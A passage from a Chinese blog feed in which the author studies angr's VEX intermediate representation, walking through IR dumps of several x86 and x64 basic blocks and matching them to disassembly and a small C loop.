<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsdWVibG9vZHllL2FydGljbGUvZGV0YWlscy8xMDQ5MTExNjg=">https://blog.csdn.net/bluebloodye/article/details/104911168<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title>VEX IR学习</title>
    <url>/52443.html</url>
    <content><![CDATA[<p>搞这个的原因是课题那边，把基本块转成VEX IR后需要进行一些modify。老师：你这周就先把VEX IR （和LLVM IR ）看懂</p>
<p>所以这篇的要求也就是能看懂和在变量名之类的做一点优化（统一）就行了</p>
<span id="more"></span>
<h2 id="代码1">代码1</h2>
<p>从程序里转了一段中间代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I32 t15:Ity_I32 t16:Ity_I32 t17:Ity_I32 t18:Ity_I32 t19:Ity_I32 t20:Ity_I32 t21:Ity_I32 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I32 t26:Ity_I32 t27:Ity_I32</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x80491b0, 1, 0) ------</span><br><span class="line">   01 | t0 = GET:I32(ebp)</span><br><span class="line">   02 | t13 = GET:I32(esp)</span><br><span class="line">   03 | t12 = Sub32(t13,0x00000004)</span><br><span class="line">   04 | PUT(esp) = t12</span><br><span class="line">   05 | STle(t12) = t0</span><br><span class="line">   06 | ------ IMark(0x80491b1, 2, 0) ------</span><br><span class="line">   07 | PUT(ebp) = t12</span><br><span class="line">   08 | ------ IMark(0x80491b3, 3, 0) ------</span><br><span class="line">   09 | t2 = Sub32(t12,0x00000018)</span><br><span class="line">   10 | PUT(cc_op) = 0x00000006</span><br><span class="line">   11 | PUT(cc_dep1) = t12</span><br><span class="line">   12 | PUT(cc_dep2) = 0x00000018</span><br><span class="line">   13 | PUT(cc_ndep) = 0x00000000</span><br><span class="line">   14 | PUT(esp) = t2</span><br><span class="line">   15 | PUT(eip) = 0x080491b6</span><br><span class="line">   16 | ------ IMark(0x80491b6, 7, 0) ------</span><br><span class="line">   17 | t15 = Add32(t12,0xfffffffc)</span><br><span class="line">   18 | STle(t15) = 0x00000000</span><br><span class="line">   19 | PUT(eip) = 0x080491bd</span><br><span class="line">   20 | ------ IMark(0x80491bd, 7, 0) ------</span><br><span class="line">   21 | t17 = Add32(t12,0xfffffff8)</span><br><span class="line">   22 | STle(t17) = 0x00000000</span><br><span class="line">   23 | ------ IMark(0x80491c4, 6, 0) ------</span><br><span class="line">   24 | PUT(eip) = 0x080491ca</span><br><span class="line">   25 | ------ IMark(0x80491ca, 3, 0) ------</span><br><span class="line">   26 | STle(t2) = 0x0804a021</span><br><span class="line">   27 | ------ IMark(0x80491cd, 3, 0) ------</span><br><span class="line">   28 | t20 = Add32(t12,0xfffffff8)</span><br><span class="line">   29 | PUT(eax) = t20</span><br><span class="line">   30 | PUT(eip) = 0x080491d0</span><br><span class="line">   31 | ------ IMark(0x80491d0, 4, 0) ------</span><br><span class="line">   32 | t22 = Add32(t2,0x00000004)</span><br><span class="line">   33 | STle(t22) = t20</span><br><span class="line">   34 | PUT(eip) = 0x080491d4</span><br><span class="line">   35 | ------ IMark(0x80491d4, 5, 0) ------</span><br><span class="line">   36 | t25 = Sub32(t2,0x00000004)</span><br><span class="line">   37 | PUT(esp) = t25</span><br><span class="line">   38 | STle(t25) = 0x080491d9</span><br><span class="line">   NEXT: PUT(eip) = 0x08049060; Ijk_Call</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>angr输出的反编译代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.pp()</span><br><span class="line">0x80491b0:	push	ebp</span><br><span class="line">0x80491b1:	mov	ebp, esp</span><br><span class="line">0x80491b3:	sub	esp, 0x18</span><br><span class="line">0x80491b6:	mov	dword ptr [ebp - 4], 0</span><br><span class="line">0x80491bd:	mov	dword ptr [ebp - 8], 0</span><br><span class="line">0x80491c4:	lea	eax, [0x804a021]</span><br><span class="line">0x80491ca:	mov	dword ptr [esp], eax</span><br><span class="line">0x80491cd:	lea	eax, [ebp - 8]</span><br><span class="line">0x80491d0:	mov	dword ptr [esp + 4], eax</span><br><span class="line">0x80491d4:	call	0x8049060</span><br></pre></td></tr></table></figure>
<p>对应ida中选中的部分：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210428124520.png" alt="20210428124520"></p>
<h3 id="分析1">分析1</h3>
<p>首先第一行表示函数的开始（IRSB在此处无意义）<br>
IRSB:</p>
<p>后续的一堆tx:Ity blabla 代表临时变量，同时指明了变量类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quote:Temporary variables. VEX uses temporary variables as internal registers.</span><br><span class="line">These temporaries are strongly typed (i.e., &quot;64-bit integer&quot; or &quot;32-bit float&quot;).</span><br></pre></td></tr></table></figure>
<p>IMark没有实际意义，仅作为一个statement，括号中的内容分别代表了在程序中的起始地址、指令长度和（不知道，不过只见过值=0）</p>
<p>对寄存器操作前需要读取该寄存器[GET]<br>
操作结束后将值写回[PUT]</p>
<p>t0 = GET:I32(ebp)：t0 gets ebp, which is a 32bit integer</p>
<p>t12 = Sub32(t13,0x00000004): t12 = t13 - 0x4</p>
<p>PUT(esp) = t12: esp = t12<br>
   [Update a register with the value of the given IR Expression.]</p>
<p>STle(t12) = t0: [t12] = t0<br>
  Update a location in memory, “le” in STle (and LDle) stands for “little-endian”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0~7行大概干了个</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br></pre></td></tr></table></figure>
<p>09行的命令很直白，但10~15指的是啥呢…似乎跟10~13出现的&quot;cc_*&quot;有挺大关系，但“cc_”只出现在arm架构的文档中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># NOTE 2: Something is goofy w/r/t archinfo and VEX; cc_op3 is used in ccalls, but there&#x27;s</span><br><span class="line"># no cc_op3 in archinfo, angr itself uses cc_depn instead.  We do the same.</span><br></pre></td></tr></table></figure>
<p>17~22对应了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     [ebp-4], 0</span><br><span class="line">mov     [ebp-4], 0</span><br></pre></td></tr></table></figure>
<p>t15=t12+0xfffffffc，此时t12=ebp。看起来很奇怪，但其实把t15指向了ebp-4的位置，（不过为啥不用减法了？…）</p>
<p>24~26行实现了两条语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491c4:	lea	eax, [0x804a021]</span><br><span class="line">0x80491ca:	mov	dword ptr [esp], eax</span><br></pre></td></tr></table></figure>
<p>24行：没有实际意义<br>
26行：<br>
此时t2=esp，把esp指向的值改为0x0804a021d<br>
相当于mov [esp],[0x804a021]<br>
所以其实是再进行了优化的（可能这就是RISC吧…)</p>
<p>28~34:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491cd:	lea	eax, [ebp - 8]</span><br><span class="line">0x80491d0:	mov	dword ptr [esp + 4], eax</span><br></pre></td></tr></table></figure>
<p>但并没有像上面一样绕过eax，直接对内存的进行修改，应该是因为针对一个基本块分析的时候要保存寄存器最后的值，不能再优化了</p>
<p>最后的跳转：<br>
放一个官方对于跳转命令的整理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef</span><br><span class="line">   enum &#123;</span><br><span class="line">      Ijk_INVALID=0x1A00, </span><br><span class="line">      Ijk_Boring,         /* not interesting; just goto next */</span><br><span class="line">      Ijk_Call,           /* guest is doing a call */</span><br><span class="line">      Ijk_Ret,            /* guest is doing a return */</span><br><span class="line">      Ijk_ClientReq,      /* do guest client req before continuing */</span><br><span class="line">      Ijk_Yield,          /* client is yielding to thread scheduler */</span><br><span class="line">      Ijk_EmWarn,         /* report emulation warning before continuing */</span><br><span class="line">      Ijk_EmFail,         /* emulation critical (FATAL) error; give up */</span><br><span class="line">      Ijk_NoDecode,       /* current instruction cannot be decoded */</span><br><span class="line">      Ijk_MapFail,        /* Vex-provided address translation failed */</span><br><span class="line">      Ijk_InvalICache,    /* Inval icache for range [CMSTART, +CMLEN) */</span><br><span class="line">      Ijk_FlushDCache,    /* Flush dcache for range [CMSTART, +CMLEN) */</span><br><span class="line">      Ijk_NoRedir,        /* Jump to un-redirected guest addr */</span><br><span class="line">      Ijk_SigILL,         /* current instruction synths SIGILL */</span><br><span class="line">      Ijk_SigTRAP,        /* current instruction synths SIGTRAP */</span><br><span class="line">      Ijk_SigSEGV,        /* current instruction synths SIGSEGV */</span><br><span class="line">      Ijk_SigBUS,         /* current instruction synths SIGBUS */</span><br><span class="line">      Ijk_SigFPE,         /* current instruction synths generic SIGFPE */</span><br><span class="line">      Ijk_SigFPE_IntDiv,  /* current instruction synths SIGFPE - IntDiv */</span><br><span class="line">      Ijk_SigFPE_IntOvf,  /* current instruction synths SIGFPE - IntOvf */</span><br><span class="line">      Ijk_Privileged,     /* current instruction should fail depending on privilege level */</span><br><span class="line">      /* Unfortunately, various guest-dependent syscall kinds.  They</span><br><span class="line">	 all mean: do a syscall before continuing. */</span><br><span class="line">      Ijk_Sys_syscall,    /* amd64/x86 &#x27;syscall&#x27;, ppc &#x27;sc&#x27;, arm &#x27;svc #0&#x27; */</span><br><span class="line">      Ijk_Sys_int32,      /* amd64/x86 &#x27;int $0x20&#x27; */</span><br><span class="line">      Ijk_Sys_int128,     /* amd64/x86 &#x27;int $0x80&#x27; */</span><br><span class="line">      Ijk_Sys_int129,     /* amd64/x86 &#x27;int $0x81&#x27; */</span><br><span class="line">      Ijk_Sys_int130,     /* amd64/x86 &#x27;int $0x82&#x27; */</span><br><span class="line">      Ijk_Sys_int145,     /* amd64/x86 &#x27;int $0x91&#x27; */</span><br><span class="line">      Ijk_Sys_int210,     /* amd64/x86 &#x27;int $0xD2&#x27; */</span><br><span class="line">      Ijk_Sys_sysenter    /* x86 &#x27;sysenter&#x27;.  guest_EIP becomes </span><br><span class="line">                             invalid at the point this happens. */</span><br><span class="line">   &#125;</span><br><span class="line">   IRJumpKind;</span><br></pre></td></tr></table></figure>
<h2 id="代码2">代码2</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I1 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I1 t15:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x80491fd, 4, 0) ------</span><br><span class="line">   01 | t5 = GET:I32(ebp)</span><br><span class="line">   02 | t4 = Add32(t5,0xfffffff8)</span><br><span class="line">   03 | t2 = LDle:I32(t4)</span><br><span class="line">   04 | PUT(cc_op) = 0x00000006</span><br><span class="line">   05 | PUT(cc_dep1) = t2</span><br><span class="line">   06 | PUT(cc_dep2) = 0x0000000a</span><br><span class="line">   07 | PUT(cc_ndep) = 0x00000000</span><br><span class="line">   08 | PUT(eip) = 0x08049201</span><br><span class="line">   09 | ------ IMark(0x8049201, 6, 0) ------</span><br><span class="line">   10 | t14 = CmpEQ32(t2,0x0000000a)</span><br><span class="line">   11 | t13 = 1Uto32(t14)</span><br><span class="line">   12 | t11 = t13</span><br><span class="line">   13 | t15 = 32to1(t11)</span><br><span class="line">   14 | t6 = t15</span><br><span class="line">   15 | if (t6) &#123; PUT(eip) = 0x8049207; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(eip) = 0x08049221; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x80491fd:	cmp	dword ptr [ebp - 8], 0xa</span><br><span class="line">0x8049201:	jne	0x8049221</span><br></pre></td></tr></table></figure>
<p>suprise…汇编好简洁</p>
<p>03行：t2=[t4]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDle：The value stored at a memory address, with the address specified by another IR Expression.</span><br></pre></td></tr></table></figure>
<p>11行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Iop_1Uto32, /* :: Ity_Bit -&gt; Ity_I32, unsigned widen */</span><br></pre></td></tr></table></figure>
<p>看一下寄存器的定义，t14的大小也是一个bit<br>
所以这个命令的作用就是把它扩展成32位的无符号数，放到t13里</p>
<p>13行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Iop_32to1,  /* :: Ity_I32 -&gt; Ity_Bit, just select bit[0] */</span><br></pre></td></tr></table></figure>
<p>再取最低位放到t15里</p>
<p>讲真没看懂这波操作为啥要这么多次转换</p>
<h2 id="分析3-来波大的">分析3_来波大的</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.vex.pp()</span><br><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I64 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I64 t5:Ity_I64 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64 t14:Ity_I64 t15:Ity_I64 t16:Ity_I64 t17:Ity_I64 t18:Ity_I128 t19:Ity_I128 t20:Ity_I64 t21:Ity_I64 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I64 t26:Ity_I64 t27:Ity_I64 t28:Ity_I64 t29:Ity_I32 t30:Ity_I32 t31:Ity_I64 t32:Ity_I64 t33:Ity_I64 t34:Ity_I64 t35:Ity_I64 t36:Ity_I32 t37:Ity_I64 t38:Ity_I64 t39:Ity_I64 t40:Ity_I64 t41:Ity_I64 t42:Ity_I64 t43:Ity_I64 t44:Ity_I32 t45:Ity_I64 t46:Ity_I64 t47:Ity_I64 t48:Ity_I32 t49:Ity_I64 t50:Ity_I64 t51:Ity_I64 t52:Ity_I64 t53:Ity_I64 t54:Ity_I32 t55:Ity_I64 t56:Ity_I64 t57:Ity_I64 t58:Ity_I64 t59:Ity_I64 t60:Ity_I64 t61:Ity_I64 t62:Ity_I64 t63:Ity_I64 t64:Ity_I32 t65:Ity_I64 t66:Ity_I64 t67:Ity_I64 t68:Ity_I64 t69:Ity_I64 t70:Ity_I64 t71:Ity_I64 t72:Ity_I32 t73:Ity_I64 t74:Ity_I64 t75:Ity_I64 t76:Ity_I64 t77:Ity_I64 t78:Ity_I64 t79:Ity_I32 t80:Ity_I64 t81:Ity_I64 t82:Ity_I64 t83:Ity_I64 t84:Ity_I128 t85:Ity_I64 t86:Ity_I64 t87:Ity_I64 t88:Ity_I64 t89:Ity_I64 t90:Ity_I64 t91:Ity_I64 t92:Ity_I64 t93:Ity_I64 t94:Ity_I64 t95:Ity_I32 t96:Ity_I32 t97:Ity_I64 t98:Ity_I64 t99:Ity_I64 t100:Ity_I64 t101:Ity_I64 t102:Ity_I64 t103:Ity_I32 t104:Ity_I64 t105:Ity_I64 t106:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x401163, 3, 0) ------</span><br><span class="line">   01 | t27 = GET:I64(rbp)</span><br><span class="line">   02 | t26 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   03 | t29 = LDle:I32(t26)</span><br><span class="line">   04 | t28 = 32Uto64(t29)</span><br><span class="line">   05 | ------ IMark(0x401166, 3, 0) ------</span><br><span class="line">   06 | t30 = 64to32(t28)</span><br><span class="line">   07 | t1 = Add32(t30,0x00000001)</span><br><span class="line">   08 | t34 = 32Uto64(t1)</span><br><span class="line">   09 | ------ IMark(0x401169, 3, 0) ------</span><br><span class="line">   10 | t36 = 64to32(t34)</span><br><span class="line">   11 | t35 = 32Sto64(t36)</span><br><span class="line">   12 | PUT(rip) = 0x000000000040116c</span><br><span class="line">   13 | ------ IMark(0x40116c, 4, 0) ------</span><br><span class="line">   14 | t40 = Shl64(t35,0x02)</span><br><span class="line">   15 | t39 = Add64(t27,t40)</span><br><span class="line">   16 | t38 = Add64(t39,0xffffffffffffffe0)</span><br><span class="line">   17 | t44 = LDle:I32(t38)</span><br><span class="line">   18 | t43 = 32Uto64(t44)</span><br><span class="line">   19 | PUT(rip) = 0x0000000000401170</span><br><span class="line">   20 | ------ IMark(0x401170, 4, 0) ------</span><br><span class="line">   21 | t45 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   22 | t48 = LDle:I32(t45)</span><br><span class="line">   23 | t47 = 32Sto64(t48)</span><br><span class="line">   24 | PUT(rip) = 0x0000000000401174</span><br><span class="line">   25 | ------ IMark(0x401174, 4, 0) ------</span><br><span class="line">   26 | t51 = Shl64(t47,0x02)</span><br><span class="line">   27 | t50 = Add64(t27,t51)</span><br><span class="line">   28 | t49 = Add64(t50,0xffffffffffffffe0)</span><br><span class="line">   29 | t54 = 64to32(t43)</span><br><span class="line">   30 | t7 = LDle:I32(t49)</span><br><span class="line">   31 | t6 = Add32(t54,t7)</span><br><span class="line">   32 | t58 = 32Uto64(t6)</span><br><span class="line">   33 | PUT(rip) = 0x0000000000401178</span><br><span class="line">   34 | ------ IMark(0x401178, 4, 0) ------</span><br><span class="line">   35 | t61 = Shl64(t47,0x02)</span><br><span class="line">   36 | t60 = Add64(t27,t61)</span><br><span class="line">   37 | t59 = Add64(t60,0xffffffffffffffe0)</span><br><span class="line">   38 | t64 = 64to32(t58)</span><br><span class="line">   39 | STle(t59) = t64</span><br><span class="line">   40 | PUT(rip) = 0x000000000040117c</span><br><span class="line">   41 | ------ IMark(0x40117c, 4, 0) ------</span><br><span class="line">   42 | t66 = Add64(t27,0xffffffffffffffd8)</span><br><span class="line">   43 | t68 = LDle:I64(t66)</span><br><span class="line">   44 | PUT(rip) = 0x0000000000401180</span><br><span class="line">   45 | ------ IMark(0x401180, 4, 0) ------</span><br><span class="line">   46 | t69 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   47 | t72 = LDle:I32(t69)</span><br><span class="line">   48 | t71 = 32Sto64(t72)</span><br><span class="line">   49 | PUT(rip) = 0x0000000000401184</span><br><span class="line">   50 | ------ IMark(0x401184, 5, 0) ------</span><br><span class="line">   51 | t75 = Shl64(t71,0x02)</span><br><span class="line">   52 | t74 = Add64(t27,t75)</span><br><span class="line">   53 | t73 = Add64(t74,0xffffffffffffffe0)</span><br><span class="line">   54 | t79 = LDle:I32(t73)</span><br><span class="line">   55 | t78 = 32Sto64(t79)</span><br><span class="line">   56 | ------ IMark(0x401189, 4, 0) ------</span><br><span class="line">   57 | t16 = Mul64(t78,t68)</span><br><span class="line">   58 | ------ IMark(0x40118d, 3, 0) ------</span><br><span class="line">   59 | ------ IMark(0x401190, 2, 0) ------</span><br><span class="line">   60 | t81 = Sar64(t16,0x3f)</span><br><span class="line">   61 | ------ IMark(0x401192, 5, 0) ------</span><br><span class="line">   62 | PUT(rcx) = 0x0000000000000002</span><br><span class="line">   63 | ------ IMark(0x401197, 3, 0) ------</span><br><span class="line">   64 | t84 = 64HLto128(t81,t16)</span><br><span class="line">   65 | t106 = CmpEQ64(0x0000000000000002,0x0000000000000000)</span><br><span class="line">   66 | if (t106) &#123; PUT(rip) = 0x401197; Ijk_SigFPE_IntDiv &#125;</span><br><span class="line">   67 | t19 = DivModS128to64(t84,0x0000000000000002)</span><br><span class="line">   68 | t88 = 128HIto64(t19)</span><br><span class="line">   69 | PUT(rdx) = t88</span><br><span class="line">   70 | PUT(rip) = 0x000000000040119a</span><br><span class="line">   71 | ------ IMark(0x40119a, 4, 0) ------</span><br><span class="line">   72 | t89 = Add64(t27,0xffffffffffffffd8)</span><br><span class="line">   73 | STle(t89) = t88</span><br><span class="line">   74 | PUT(rip) = 0x000000000040119e</span><br><span class="line">   75 | ------ IMark(0x40119e, 3, 0) ------</span><br><span class="line">   76 | t92 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   77 | t95 = LDle:I32(t92)</span><br><span class="line">   78 | t94 = 32Uto64(t95)</span><br><span class="line">   79 | ------ IMark(0x4011a1, 3, 0) ------</span><br><span class="line">   80 | t96 = 64to32(t94)</span><br><span class="line">   81 | t22 = Add32(t96,0x00000001)</span><br><span class="line">   82 | PUT(cc_op) = 0x0000000000000003</span><br><span class="line">   83 | t98 = 32Uto64(t96)</span><br><span class="line">   84 | PUT(cc_dep1) = t98</span><br><span class="line">   85 | PUT(cc_dep2) = 0x0000000000000001</span><br><span class="line">   86 | t100 = 32Uto64(t22)</span><br><span class="line">   87 | PUT(rax) = t100</span><br><span class="line">   88 | PUT(rip) = 0x00000000004011a4</span><br><span class="line">   89 | ------ IMark(0x4011a4, 3, 0) ------</span><br><span class="line">   90 | t101 = Add64(t27,0xffffffffffffffd4)</span><br><span class="line">   91 | t103 = 64to32(t100)</span><br><span class="line">   92 | STle(t101) = t103</span><br><span class="line">   93 | ------ IMark(0x4011a7, 5, 0) ------</span><br><span class="line">   NEXT: PUT(rip) = 0x0000000000401159; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>angr的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.pp()</span><br><span class="line">0x401163:	mov	eax, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401166:	add	eax, 1</span><br><span class="line">0x401169:	movsxd	rcx, eax</span><br><span class="line">0x40116c:	mov	eax, dword ptr [rbp + rcx*4 - 0x20]</span><br><span class="line">0x401170:	movsxd	rcx, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401174:	add	eax, dword ptr [rbp + rcx*4 - 0x20]</span><br><span class="line">0x401178:	mov	dword ptr [rbp + rcx*4 - 0x20], eax</span><br><span class="line">0x40117c:	mov	rcx, qword ptr [rbp - 0x28]</span><br><span class="line">0x401180:	movsxd	rdx, dword ptr [rbp - 0x2c]</span><br><span class="line">0x401184:	movsxd	rdx, dword ptr [rbp + rdx*4 - 0x20]</span><br><span class="line">0x401189:	imul	rcx, rdx</span><br><span class="line">0x40118d:	mov	rax, rcx</span><br><span class="line">0x401190:	cqo	</span><br><span class="line">0x401192:	mov	ecx, 2</span><br><span class="line">0x401197:	idiv	rcx</span><br><span class="line">0x40119a:	mov	qword ptr [rbp - 0x28], rdx</span><br><span class="line">0x40119e:	mov	eax, dword ptr [rbp - 0x2c]</span><br><span class="line">0x4011a1:	add	eax, 1</span><br><span class="line">0x4011a4:	mov	dword ptr [rbp - 0x2c], eax</span><br><span class="line">0x4011a7:	jmp	0x401159</span><br></pre></td></tr></table></figure>
<p>这段代码是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">	a[i]+=a[i+<span class="number">1</span>];</span><br><span class="line">	j=j*a[i]%<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>的循环部分</p>
<p>01~04：执行后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t26=rbp-0x2c</span><br><span class="line">t29=dowrd ptr [rbp-0x2c]=eax</span><br><span class="line">t28=eax(64bits)</span><br></pre></td></tr></table></figure>
<p>结合下一步的操作，不是很懂意义何在…</p>
<p>11行：出现了vex ir 指令，Sto，S指的是singed widen；类似的Uto中，U指的是unsigned widen<br>
对于这行代码的理解可以参考汇编中的movsxd：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> MOVSXD r64, r/m32       Move doubleword to quadword with sign-extension.</span><br><span class="line">这是64位代码的指令，该指令将32位寄存器或地址转换为32位值，并将其符号扩展为64位寄存器。符号扩展是获取源的最高位（符号位）的值，并使用它来填充目标的所有高位。</span><br></pre></td></tr></table></figure>
<p>到57行前都是些重复的语句</p>
<p>57行：<br>
mul64：官方文档中写道，mul代表的是signless的，相对的有以下乘法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">      /* -- Ordering not important after here. -- */</span><br><span class="line">      ...</span><br><span class="line">      /* Widening multiplies */</span><br><span class="line">      Iop_MullS8, Iop_MullS16, Iop_MullS32, Iop_MullS64,</span><br><span class="line">      Iop_MullU8, Iop_MullU16, Iop_MullU32, Iop_MullU64,</span><br><span class="line"></span><br><span class="line">(看上去和arm的精简指令集挺像的)</span><br></pre></td></tr></table></figure>
<p>看到这行产生了个疑惑：imul是带符号的，但mul64是个无符号的乘法<br>
再往下看看，发现，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t16=Mul64(t78,t68)</span><br><span class="line">t81=Sar64(t16,0x3f)</span><br></pre></td></tr></table></figure>
<p>完成了以下三条汇编指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x401189:	imul	rcx, rdx</span><br><span class="line">0x40118d:	mov	rax, rcx</span><br><span class="line">0x401190:	cqo	</span><br></pre></td></tr></table></figure>
<p>sar64：官方文档中没有描述作用，猜测和x64汇编相似，即算术右移（用符号位补）<br>
cqo：将rax中的符号复制到rdx的每个位上</p>
<p>64~70行：<br>
简单的一条</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idiv rcx</span><br></pre></td></tr></table></figure>
<p>被转换成了七行ir</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64 | t84 = 64HLto128(t81,t16)</span><br><span class="line">65 | t106 = CmpEQ64(0x0000000000000002,0x0000000000000000)</span><br><span class="line">66 | if (t106) &#123; PUT(rip) = 0x401197; Ijk_SigFPE_IntDiv &#125;</span><br><span class="line">67 | t19 = DivModS128to64(t84,0x0000000000000002)</span><br><span class="line">68 | t88 = 128HIto64(t19)</span><br><span class="line">69 | PUT(rdx) = t88</span><br><span class="line">70 | PUT(rip) = 0x000000000040119a</span><br></pre></td></tr></table></figure>
<p>涉及到了几个没有见过的VEX IR 指令：<br>
64HLto128：两个64位的寄存器里的值组合扩展到128位的寄存器中<br>
DivModS128to64：:: V128,I64 -&gt; V128，of which lo half is div and hi half is mod<br>
128HIto64：128位数据中的高64位复制到64位寄存器中</p>
<p>82~85行，出现了“cc_*”的“寄存器”，但似乎对理解这个基本块的VEX IR完全没有影响…（不会是因为代码片段还不够长吧orz）</p>
<h3 id="第二段">第二段</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; irsb.vex.pp()</span><br><span class="line">IRSB &#123;</span><br><span class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I64 t4:Ity_I64 t5:Ity_I64 t6:Ity_I64 t7:Ity_I64 t8:Ity_I1 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64 t14:Ity_I64 t15:Ity_I64 t16:Ity_I64 t17:Ity_I1 t18:Ity_I32 t19:Ity_I32 t20:Ity_I1</span><br><span class="line"></span><br><span class="line">   00 | ------ IMark(0x401159, 4, 0) ------</span><br><span class="line">   01 | t5 = GET:I64(rbp)</span><br><span class="line">   02 | t4 = Add64(t5,0xffffffffffffffd4)</span><br><span class="line">   03 | t2 = LDle:I32(t4)</span><br><span class="line">   04 | PUT(cc_op) = 0x0000000000000007</span><br><span class="line">   05 | t15 = 32Uto64(t2)</span><br><span class="line">   06 | t6 = t15</span><br><span class="line">   07 | PUT(cc_dep1) = t6</span><br><span class="line">   08 | PUT(cc_dep2) = 0x0000000000000003</span><br><span class="line">   09 | PUT(rip) = 0x000000000040115d</span><br><span class="line">   10 | ------ IMark(0x40115d, 6, 0) ------</span><br><span class="line">   11 | t18 = 64to32(0x0000000000000003)</span><br><span class="line">   12 | t19 = 64to32(t6)</span><br><span class="line">   13 | t17 = CmpLT32S(t19,t18)</span><br><span class="line">   14 | t16 = 1Uto64(t17)</span><br><span class="line">   15 | t13 = t16</span><br><span class="line">   16 | t20 = 64to1(t13)</span><br><span class="line">   17 | t8 = t20</span><br><span class="line">   18 | if (t8) &#123; PUT(rip) = 0x401163; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(rip) = 0x00000000004011ac; Ijk_Boring</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反汇编结果：</span><br><span class="line">```asm</span><br><span class="line">0x401159:	cmp	dword ptr [rbp - 0x2c], 3</span><br><span class="line">0x40115d:	jge	0x4011ac</span><br></pre></td></tr></table></figure>
<p>第一部分13行：cmpLT32S<br>
官方文档中的解释很短：</p>
